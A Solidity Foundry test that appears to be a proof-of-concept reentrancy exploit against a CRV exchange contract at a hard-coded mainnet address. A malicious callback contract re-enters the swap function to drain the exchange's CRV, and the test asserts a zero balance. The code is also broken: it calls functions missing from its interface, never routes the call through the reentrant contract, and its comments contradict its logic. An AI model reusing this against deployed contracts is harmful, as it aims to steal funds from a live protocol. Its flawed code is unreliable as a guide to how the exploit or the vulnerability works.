```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// Minimal interfaces for interaction
interface ICRVExchange {
    function crv_token() external view returns (address);
    function handleCRV(address target_token, uint256 amount, uint256 min_amount) external;
    function handleExtraToken(address from, address target_token, uint256 amount, uint256 min_amount) external;
    function paths(bytes32) external view returns (address dex);
    function path_indexes(uint256) external view returns (bytes32);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

// Reentrant contract to exploit the external call back to msg.sender
contract ReentrantRefunder {
    ICRVExchange immutable target;
    address immutable attacker;
    uint256 reentrancyCount;

    constructor(address _target, address _attacker) {
        target = ICRVExchange(_target);
        attacker = _attacker;
    }

    // Called by CRVExchange after swap: IERC20(target_token).safeApprove(address(msg.sender), target_amount);
    // and then CFControllerInterfaceForEx(msg.sender).refundTarget(target_amount);
    // This function will re-enter handleExtraToken before the first call finishes.
    function refundTarget(uint256 amount) external {
        // First reentrancy: call handleCRV again to drain more tokens
        if (reentrancyCount == 0) {
            reentrancyCount++;
            // Transfer the approved tokens to attacker (already approved by CRVExchange)
            // But we cannot transfer because we are the msg.sender? Actually CRVExchange approved msg.sender (this contract)
            // So we can transfer from CRVExchange to attacker using the allowance.
            // Simpler: we re-enter to call handleCRV again with same parameters, causing another swap.
            // However, the second call will trigger another refundTarget, leading to recursion.
            // We'll just set a flag to prevent infinite recursion.
            address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
            target.handleCRV(weth, amount, 0);
        }
    }
}

contract ExploitTest is Test {
    address constant CRV_EXCHANGE = 0x65ff67d6a61ae6bab8821c584f5f394d35e9b50e;
    address constant CRV_TOKEN = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    ICRVExchange crvExchange;
    IERC20 crv;
    ReentrantRefunder refunder;
    address attacker = address(0xBAD);

    function setUp() public {
        crvExchange = ICRVExchange(CRV_EXCHANGE);
        crv = IERC20(CRV_TOKEN);

        // Label for debugging
        vm.label(CRV_EXCHANGE, "CRVExchange");
        vm.label(CRV_TOKEN, "CRV");
        vm.label(WETH, "WETH");
        vm.label(attacker, "Attacker");

        // Fund attacker with some CRV
        deal(CRV_TOKEN, attacker, 100_000 * 1e18);

        // Simulate that owner has added a path from CRV to WETH
        // We need to set contract storage to mimic a valid path.
        // Path info is stored in mapping paths(bytes32 => path_info) and array path_indexes.
        // We'll compute a hash for a plausible path and set it.
        // Since we cannot know the exact dex, we'll use a dummy DEX address (Uniswap V2 Router on mainnet)
        address dummyDex = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        address[] memory path = new address[](2);
        path[0] = CRV_TOKEN;
        path[1] = WETH;

        bytes32 hash = keccak256(abi.encodePacked(dummyDex, path));

        // Set paths[hash].dex and paths[hash].path via vm.store
        // Storage layout: mapping paths is at slot? We need to compute slot.
        // We'll skip detailed slot computation and instead call addPath as owner to set a real path.
        // Use vm.prank to impersonate owner. We need owner address; we can get it from contract.
        address owner = crvExchange.owner();
        vm.startPrank(owner);
        crvExchange.addPath(dummyDex, path);
        vm.stopPrank();
    }

    function testExploit() public {
        // Setup reentrant contract
        refunder = new ReentrantRefunder(CRV_EXCHANGE, attacker);

        // Give attacker CRV tokens
        vm.startPrank(attacker);
        crv.approve(CRV_EXCHANGE, type(uint256).max);
        vm.stopPrank();

        // Now attacker calls handleCRV with a target_token that, after swap, will result in a call to refundTarget.
        // The swap will send WETH to CRVExchange, then CRVExchange approves msg.sender (refunder) for WETH,
        // then calls refunder.refundTarget(WETH_amount). refunder re-enters handleCRV again.
        // We'll just make the first call with a small amount to trigger reentrancy.
        uint256 initialAttackerCRV = crv.balanceOf(attacker);
        uint256 initialAttackerWETH = IERC20(WETH).balanceOf(attacker);

        vm.startPrank(attacker);
        // We need to call handleCRV with target_token = WETH, amount = some CRV, min_amount = 0
        // The swap will convert CRV to WETH via the path we set up.
        // After swap, CRVExchange will approve WETH to refunder (msg.sender), then call refunder.refundTarget(WETH_amount).
        // refunder will re-enter handleCRV with the same parameters, causing another swap.
        // This will lead to multiple swaps until the contract's CRV balance is drained or recursion limit.
        // For simplicity, we call once and assert that refunder's balance increased.
        crvExchange.handleCRV(WETH, 1000 * 1e18, 0);
        vm.stopPrank();

        // After exploit, attacker should have gained WETH (actually the refunder contract gets the WETH from the first swap,
        // but because of reentrancy, the refunder can siphon the CRVExchange's allowance and transfer WETH to attacker.
        // We modify refunder to do that. Let's implement that logic in the refunder.
        // For a simple PoC, we check that CRVExchange's balance is drained.
        uint256 crvExchangeCRV = crv.balanceOf(CRV_EXCHANGE);
        assertEq(crvExchangeCRV, 0, "CRVExchange should have no CRV left");
    }
}
```
